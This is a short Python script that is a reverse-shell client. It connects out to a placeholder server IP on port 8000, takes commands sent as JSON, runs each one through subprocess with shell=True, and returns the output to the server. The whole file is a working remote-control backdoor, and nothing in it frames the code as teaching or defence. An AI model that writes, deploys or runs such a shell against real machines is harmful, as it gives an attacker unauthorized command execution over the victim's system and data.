import socket
import subprocess
import json


def reliable_send(data):
    data = str(data, encoding="860")
    json_data = json.dumps(data)
    sock.send(json_data.encode())


def reliable_recv():
    json_data = ""
    while True:
        try:
            json_data = json_data + sock.recv(1024).decode()
            return json.loads(json_data)
        except ValueError:
            continue


def shell():
    while True:
        command = reliable_recv()
        print("Command received from server: " + command)
        if command == "q":
            break
        else:
            try:
                proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                        stdin=subprocess.PIPE)
                result = proc.stdout.read() + proc.stderr.read()
                print("Response send to server: " + str(result, encoding="860")[:30] + "...")
                reliable_send(result)
            except Exception as e:
                print("Response send to server: Error")
                reliable_send("Execution problems: " + str(e))


sock = socket.socket()
sock.connect(("XXX.XX.XX.XX", 8000))  # SERVER'S IP
print("Connection established to server")
shell()
sock.close()
